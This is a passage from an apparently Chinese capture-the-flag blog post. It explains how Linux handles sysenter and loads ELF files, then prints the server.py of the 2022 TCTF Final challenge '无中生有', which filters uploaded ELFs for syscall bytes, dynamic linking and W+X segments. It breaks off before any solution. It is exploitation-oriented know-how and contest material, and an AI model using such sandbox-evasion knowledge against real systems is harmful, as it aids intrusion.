help<br></code></pre></td></tr></table></figure><p>解释一下为什么sysenter返回之后程序回跑飞</p><ul><li><p>在一系列处理之后会调用do_SYSENTER_32正式处理sysenter，在这之前的pt_regs</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>│ rdi rsp <span class="hljs-number">0xffffc90000463f58</span> ◂— <span class="hljs-number">0x1</span>r15<br><span class="hljs-number">01</span>:<span class="hljs-number">0008</span>│         <span class="hljs-number">0xffffc90000463f60</span> —▸ <span class="hljs-number">0x4c17d0</span>r14<br><span class="hljs-number">02</span>:<span class="hljs-number">0010</span>│         <span class="hljs-number">0xffffc90000463f68</span> —▸ <span class="hljs-number">0x7ffe7a28fff8</span> r13<br><span class="hljs-number">03</span>:<span class="hljs-number">0018</span>│         <span class="hljs-number">0xffffc90000463f70</span> ◂— <span class="hljs-number">0x1</span>r12<br><span class="hljs-number">04</span>:<span class="hljs-number">0020</span>│         <span class="hljs-number">0xffffc90000463f78</span> —▸ <span class="hljs-number">0x7ffe7a28fe10</span> bp<br><span class="hljs-number">05</span>:<span class="hljs-number">0028</span>│         <span class="hljs-number">0xffffc90000463f80</span> ◂— <span class="hljs-number">0x2c</span>bx<br><span class="hljs-number">06</span>:<span class="hljs-number">0030</span>│         <span class="hljs-number">0xffffc90000463f88</span> ◂— <span class="hljs-number">0x206</span>r11<br><span class="hljs-number">07</span>:<span class="hljs-number">0038</span>│         <span class="hljs-number">0xffffc90000463f90</span> ◂— <span class="hljs-number">0x80</span>r10<br><span class="hljs-number">08</span>:<span class="hljs-number">0040</span>│         <span class="hljs-number">0xffffc90000463f98</span> ◂— <span class="hljs-number">0x800000000000</span> r9<br><span class="hljs-number">09</span>:<span class="hljs-number">0048</span>│         <span class="hljs-number">0xffffc90000463fa0</span> —▸ <span class="hljs-number">0x4c7d70</span> r8<br><span class="hljs-number">0</span>a:<span class="hljs-number">0050</span>│         <span class="hljs-number">0xffffc90000463fa8</span> ◂— <span class="hljs-number">0xffffffffffffffda</span>  ax<br><span class="hljs-number">0b</span>:<span class="hljs-number">0058</span>│         <span class="hljs-number">0xffffc90000463fb0</span> ◂— <span class="hljs-number">0xa</span>cx<br><span class="hljs-number">0</span>c:<span class="hljs-number">0060</span>│         <span class="hljs-number">0xffffc90000463fb8</span> —▸ <span class="hljs-number">0x7ffe7a290008</span> dx<br><span class="hljs-number">0</span>d:<span class="hljs-number">0068</span>│         <span class="hljs-number">0xffffc90000463fc0</span> —▸ <span class="hljs-number">0x7ffe7a28fff8</span> si<br><span class="hljs-number">0</span>e:<span class="hljs-number">0070</span>│         <span class="hljs-number">0xffffc90000463fc8</span> ◂— <span class="hljs-number">0x1</span>di<br><span class="hljs-number">0f</span>:<span class="hljs-number">0078</span>│         <span class="hljs-number">0xffffc90000463fd0</span> ◂— <span class="hljs-number">0x1</span>orig_ax<br><span class="hljs-number">10</span>:<span class="hljs-number">0080</span>│         <span class="hljs-number">0xffffc90000463fd8</span> ◂— <span class="hljs-number">0x0</span>ip<br><span class="hljs-number">11</span>:<span class="hljs-number">0088</span>│         <span class="hljs-number">0xffffc90000463fe0</span> ◂— <span class="hljs-number">0x23</span>cs<br><span class="hljs-number">12</span>:<span class="hljs-number">0090</span>│         <span class="hljs-number">0xffffc90000463fe8</span> ◂— <span class="hljs-number">0x6</span>flags<br><span class="hljs-number">13</span>:<span class="hljs-number">0098</span>│         <span class="hljs-number">0xffffc90000463ff0</span> ◂— <span class="hljs-number">0x0</span>sp<br><span class="hljs-number">14</span>:<span class="hljs-number">00</span>a0│         <span class="hljs-number">0xffffc90000463ff8</span> ◂— <span class="hljs-number">0x2b</span>ss<br></code></pre></td></tr></table></figure><p>来康康为什么会变成这样，和用户态不一样的寄存器有rsp，rip，cs（不管rax，ss，cs）</p><p>在push寄存器的时候会直接把rsp和rip记为0，cs置为32位的cs</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pushq$0/* pt_regs-&gt;sp = 0 (placeholder) */<br>pushfq/* pt_regs-&gt;flags (except IF = 0) */<br>pushq$__USER32_CS/* pt_regs-&gt;cs */<br>pushq$0/* pt_regs-&gt;ip = 0 (placeholder) */<br></code></pre></td></tr></table></figure></li><li><p>调用do_SYSENTER_32后的pt_regs</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>│ rsp <span class="hljs-number">0xffffc90000463f58</span> ◂— <span class="hljs-number">0x1</span>r15<br><span class="hljs-number">01</span>:<span class="hljs-number">0008</span>│     <span class="hljs-number">0xffffc90000463f60</span> —▸ <span class="hljs-number">0x4c17d0</span> r14<br><span class="hljs-number">02</span>:<span class="hljs-number">0010</span>│     <span class="hljs-number">0xffffc90000463f68</span> —▸ <span class="hljs-number">0x7ffe7a28fff8</span> r13<br><span class="hljs-number">03</span>:<span class="hljs-number">0018</span>│     <span class="hljs-number">0xffffc90000463f70</span> ◂— <span class="hljs-number">0x1</span>r12<br><span class="hljs-number">04</span>:<span class="hljs-number">0020</span>│     <span class="hljs-number">0xffffc90000463f78</span> ◂— <span class="hljs-number">0x7ffe00000000</span> bp<span class="hljs-comment">// change!</span><br><span class="hljs-number">05</span>:<span class="hljs-number">0028</span>│     <span class="hljs-number">0xffffc90000463f80</span> ◂— <span class="hljs-number">0x2c</span>bx<br><span class="hljs-number">06</span>:<span class="hljs-number">0030</span>│     <span class="hljs-number">0xffffc90000463f88</span> ◂— <span class="hljs-number">0x206</span>r11<br><span class="hljs-number">07</span>:<span class="hljs-number">0038</span>│     <span class="hljs-number">0xffffc90000463f90</span> ◂— <span class="hljs-number">0x80</span>r10<br><span class="hljs-number">08</span>:<span class="hljs-number">0040</span>│     <span class="hljs-number">0xffffc90000463f98</span> ◂— <span class="hljs-number">0x800000000000</span> r9<br><span class="hljs-number">09</span>:<span class="hljs-number">0048</span>│     <span class="hljs-number">0xffffc90000463fa0</span> —▸ <span class="hljs-number">0x4c7d70</span> r8<br><span class="hljs-number">0</span>a:<span class="hljs-number">0050</span>│     <span class="hljs-number">0xffffc90000463fa8</span> ◂— <span class="hljs-number">0xfffffffffffffff2</span>  ax<br><span class="hljs-number">0b</span>:<span class="hljs-number">0058</span>│     <span class="hljs-number">0xffffc90000463fb0</span> ◂— <span class="hljs-number">0xa</span>cx<br><span class="hljs-number">0</span>c:<span class="hljs-number">0060</span>│     <span class="hljs-number">0xffffc90000463fb8</span> —▸ <span class="hljs-number">0x7ffe7a290008</span> dx<br><span class="hljs-number">0</span>d:<span class="hljs-number">0068</span>│     <span class="hljs-number">0xffffc90000463fc0</span> —▸ <span class="hljs-number">0x7ffe7a28fff8</span> si<br><span class="hljs-number">0</span>e:<span class="hljs-number">0070</span>│     <span class="hljs-number">0xffffc90000463fc8</span> ◂— <span class="hljs-number">0x1</span>di<br><span class="hljs-number">0f</span>:<span class="hljs-number">0078</span>│     <span class="hljs-number">0xffffc90000463fd0</span> ◂— <span class="hljs-number">0x1</span>orig_ax<br><span class="hljs-number">10</span>:<span class="hljs-number">0080</span>│     <span class="hljs-number">0xffffc90000463fd8</span> —▸ <span class="hljs-number">0x7ffe7a3f0579</span> ip<span class="hljs-comment">// change!</span><br><span class="hljs-number">11</span>:<span class="hljs-number">0088</span>│     <span class="hljs-number">0xffffc90000463fe0</span> ◂— <span class="hljs-number">0x23</span>cs<br><span class="hljs-number">12</span>:<span class="hljs-number">0090</span>│     <span class="hljs-number">0xffffc90000463fe8</span> ◂— <span class="hljs-number">0x206</span>flags<span class="hljs-comment">// change!</span><br><span class="hljs-number">13</span>:<span class="hljs-number">0098</span>│     <span class="hljs-number">0xffffc90000463ff0</span> —▸ <span class="hljs-number">0x7ffe7a28fe10</span> sp <span class="hljs-comment">// change!</span><br><span class="hljs-number">14</span>:<span class="hljs-number">00</span>a0│     <span class="hljs-number">0xffffc90000463ff8</span> ◂— <span class="hljs-number">0x2b</span>ss<br><br></code></pre></td></tr></table></figure><ul><li><p>sysenter使用rbp作为返回时的rsp，flags要加上X86_EFLAGS_IF的标志</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">__visible noinstr <span class="hljs-type">long</span> <span class="hljs-title function_">do_SYSENTER_32</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pt_regs *regs)</span><br>&#123;<br><span class="hljs-comment">/* SYSENTER loses RSP, but the vDSO saved it in RBP. */</span><br>regs-&gt;sp = regs-&gt;bp;<br><br><span class="hljs-comment">/* SYSENTER clobbers EFLAGS.IF.  Assume it was set in usermode. */</span><br>regs-&gt;flags |= X86_EFLAGS_IF;<br><br><span class="hljs-keyword">return</span> do_fast_syscall_32(regs);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>do_fast_syscall_32会自动设置rip为vsdo中一段固定的landing的地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> landing_pad = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)current-&gt;mm-&gt;context.vdso +<br>vdso_image_32.sym_int80_landing_pad;<br>    <br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * SYSENTER loses EIP, and even SYSCALL32 needs us to skip forward</span><br><span class="hljs-comment"> * so that &#x27;regs-&gt;ip -= 2&#x27; lands back on an int $0x80 instruction.</span><br><span class="hljs-comment"> * Fix it up.</span><br><span class="hljs-comment"> */</span><br>regs-&gt;ip = landing_pad;<br></code></pre></td></tr></table></figure></li></ul></li><li><p>由于已经将cs设置为32位，所以iretq之后寄存器会被截半</p><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/iretq.png" class title="iretq"></li></ul><p>来看一下正常的sysenter的执行过程</p><ul><li><p>一个sysenter一定是从vdso中来的（传参顺序ebx，ecx，edx）</p><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/writevdso.png" class title="writevdso"><p>可以看出ebp是用来存esp的</p><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/vdsoo.png" class title="vdso"><p>sysenter的参数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Arguments:</span><br><span class="hljs-comment"> * eax  system call number</span><br><span class="hljs-comment"> * ebx  arg1</span><br><span class="hljs-comment"> * ecx  arg2</span><br><span class="hljs-comment"> * edx  arg3</span><br><span class="hljs-comment"> * esi  arg4</span><br><span class="hljs-comment"> * edi  arg5</span><br><span class="hljs-comment"> * ebp  user stack</span><br><span class="hljs-comment"> * 0(%ebp) arg6</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure></li><li><p>do_SYSENTER_32返回之后，可以看出landing_pad已经设置好了</p><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/landing.png" class title="landing"></li><li><p>landing成功（如果sysenter失败还要继续int 0x80）</p></li></ul><h2 id="ELF文件启动过程"><a href="#ELF文件启动过程" class="headerlink" title="ELF文件启动过程"></a>ELF文件启动过程</h2><p>解释一些特性的原理</p><ul><li><p>GNU_STACK设为X则权限为RWX</p><p>Linux中对于栈的权限只有可执行和不可执行的判断，默认是可读写的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Stack area protections */</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EXSTACK_DEFAULT   0<span class="hljs-comment">/* Whatever the arch defaults to */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EXSTACK_DISABLE_X 1<span class="hljs-comment">/* Disable executable stacks */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EXSTACK_ENABLE_X  2<span class="hljs-comment">/* Enable executable stacks */</span></span><br><br><br>elf_ppnt = elf_phdata;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; elf_ex-&gt;e_phnum; i++, elf_ppnt++)<br><span class="hljs-keyword">switch</span> (elf_ppnt-&gt;p_type) &#123;<br><span class="hljs-keyword">case</span> PT_GNU_STACK:<br><span class="hljs-keyword">if</span> (elf_ppnt-&gt;p_flags &amp; PF_X)<br>executable_stack = EXSTACK_ENABLE_X;<br><span class="hljs-keyword">else</span><br>executable_stack = EXSTACK_DISABLE_X;<br><span class="hljs-keyword">break</span>;<br></code></pre></td></tr></table></figure></li><li><p>64位和32位的检查是通过e_machine</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Verify the interpreter has a valid arch */</span><br><span class="hljs-keyword">if</span> (!elf_check_arch(interp_elf_ex) ||<br>    elf_check_fdpic(interp_elf_ex))<br><span class="hljs-keyword">goto</span> out_free_dentry;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>elf_check_archcompat_elf_check_arch</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> compat_elf_check_arch(x)\</span><br><span class="hljs-meta">(elf_check_arch_ia32(x) ||\</span><br><span class="hljs-meta"> (IS_ENABLED(CONFIG_X86_X32_ABI) &amp;&amp; (x)-&gt;e_machine == EM_X86_64))</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> elf_check_arch_ia32(x) \</span><br><span class="hljs-meta">(((x)-&gt;e_machine == EM_386) || ((x)-&gt;e_machine == EM_486))</span><br></code></pre></td></tr></table></figure></li></ul><h1 id="2022-TCTF-Final-无中生有"><a href="#2022-TCTF-Final-无中生有" class="headerlink" title="2022 TCTF Final 无中生有"></a>2022 TCTF Final 无中生有</h1><h2 id="server-py"><a href="#server-py" class="headerlink" title="server.py"></a>server.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3 -u</span><br><br><span class="hljs-keyword">import</span> os, sys, random, subprocess, gmpy2<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><span class="hljs-keyword">from</span> elftools.elf.elffile <span class="hljs-keyword">import</span> ELFFile<br><span class="hljs-keyword">from</span> elftools.elf.constants <span class="hljs-keyword">import</span> P_FLAGS<br><br>os.chdir(os.path.dirname(__file__))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">proof_of_work</span>(<span class="hljs-params">sec = <span class="hljs-number">10</span></span>):<br>    <span class="hljs-comment"># From 0CTF/TCTF 2021</span><br>    p = gmpy2.next_prime(random.getrandbits(<span class="hljs-number">512</span>))<br>    q = gmpy2.next_prime(random.getrandbits(<span class="hljs-number">512</span>))<br>    n = p*q<br>    c = <span class="hljs-number">2900000</span><br>    t = c*sec + random.randint(<span class="hljs-number">0</span>,c)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Show me your computation:&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;2^(2^<span class="hljs-subst">&#123;t&#125;</span>) mod <span class="hljs-subst">&#123;n&#125;</span> = ?&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Your answer: &#x27;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        sol = <span class="hljs-built_in">int</span>(sys.stdin.readline())<br>        phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>        u = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, t, phi)<br>        w = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, u, n)<br>        <span class="hljs-keyword">if</span> w == sol:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Correct!&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Wrong Answer!&#x27;</span>)<br>            exit()<br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Invalid Input!&#x27;</span>)<br>        exit()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_bytes</span>(<span class="hljs-params">data, b</span>):<br>    p = -<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        p = data.find(b, p+<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> p == -<span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">elif</span> p &amp; <span class="hljs-number">0xfff</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> p &amp; <span class="hljs-number">0xfff</span> == <span class="hljs-number">0xfff</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_elf</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) &lt; <span class="hljs-number">0x40</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Incomplete ELF Header&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data.startswith(<span class="hljs-string">b&#x27;\x7fELF\x02\x01\x01&#x27;</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">9</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Invalid ELF Magic&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;\xcd\x80&#x27;</span> <span class="hljs-keyword">in</span> data <span class="hljs-keyword">or</span> <span class="hljs-string">b&#x27;\x0f\x05&#x27;</span> <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bad Instruction&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_bytes(data, <span class="hljs-string">b&#x27;\xcd&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> check_bytes(data, <span class="hljs-string">b&#x27;\x80&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> check_bytes(data, <span class="hljs-string">b&#x27;\x0f&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> check_bytes(data, <span class="hljs-string">b&#x27;\x05&#x27;</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bad Instruction&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    elf = ELFFile(BytesIO(data))<br>    <span class="hljs-keyword">if</span> ((elf.header.e_type != <span class="hljs-string">&#x27;ET_EXEC&#x27;</span> <span class="hljs-keyword">and</span> elf.header.e_type != <span class="hljs-string">&#x27;ET_DYN&#x27;</span>)<br>        <span class="hljs-keyword">or</span> elf.header.e_version != <span class="hljs-string">&#x27;EV_CURRENT&#x27;</span><br>        <span class="hljs-keyword">or</span> elf.header.e_ehsize != <span class="hljs-number">0x40</span><br>        <span class="hljs-keyword">or</span> elf.header.e_phoff != <span class="hljs-number">0x40</span><br>        <span class="hljs-keyword">or</span> elf.header.e_phnum &lt;= <span class="hljs-number">0</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bad ELF Header&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">for</span> seg <span class="hljs-keyword">in</span> elf.iter_segments():<br>        <span class="hljs-keyword">if</span> seg.header.p_type == <span class="hljs-string">&#x27;PT_INTERP&#x27;</span> <span class="hljs-keyword">or</span> seg.header.p_type == <span class="hljs-string">&#x27;PT_DYNAMIC&#x27;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;No dynamic link&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> seg.header.p_flags &amp; P_FLAGS.PF_W <span class="hljs-keyword">and</span> seg.header.p_flags &amp; P_FLAGS.PF_X:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;W^X&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> seg.header.p_filesz &gt; <span class="hljs-built_in">len</span>(data) <span class="hljs-keyword">or</span> seg.header.p_memsz &gt; <span class="hljs-built_in">len</span>(data):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Segment too large&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">try</span>:<br>        size = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Size of your ELF: &#x27;</span>))<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Invalid size!&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">if</span> size &lt;= <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> size &gt; <span class="hljs-number">0x10000</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bad size!&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ELF File:&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        data = sys.stdin.buffer.read(size)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Invalid file data&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) != size:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Incomplete file data&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ELF Received: %d bytes&#x27;</span> % <span class="hljs-built_in">len</span>(data))<br>    <span class="hljs-keyword">if</span> check_elf(data):<br>        filename = sha256(data).hexdigest()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;File Hash: %s&#x27;</span> % filename)<br>        path = <span class="hljs-string">&#x27;./data/&#x27;</span> + filename<br>        <span class="hljs-keyword">if</span> os.path.exists(path):<br>            os.unlink(path)<br>        <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&#x27;wb&#x27;</span>).write(data)<br>        os.chmod(path, <span class="hljs-number">0o555</span>)<br>        <span class="hljs-keyword">try</span>:<br>            p = subprocess.Popen([<span class="hljs-string">&#x27;docker&#x27;</span>, <span class="hljs-string">&#x27;run&#x27;</span>, <span class="hljs-string">&#x27;-i&#x27;</span>, <span class="hljs-string">&#x27;--rm&#x27;</span>, <span class="hljs-string">&#x27;-v&#x27;</span>, <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;path&#125;</span>:/<span class="hljs-subst">&#123;filename&#125;</span>&#x27;</span>, <span class="hljs-string">&#x27;challenge&#x27;</span>, filename], stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)<br>            p.wait()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Return status: %d&#x27;</span> % p.returncode)<br>            <span class="hljs-keyword">if</span> p.returncode == <span class="hljs-number">137</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Output:&#x27;</span>)<br>                sys.stdout.buffer.write(p.stdout.read())<br>                <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span 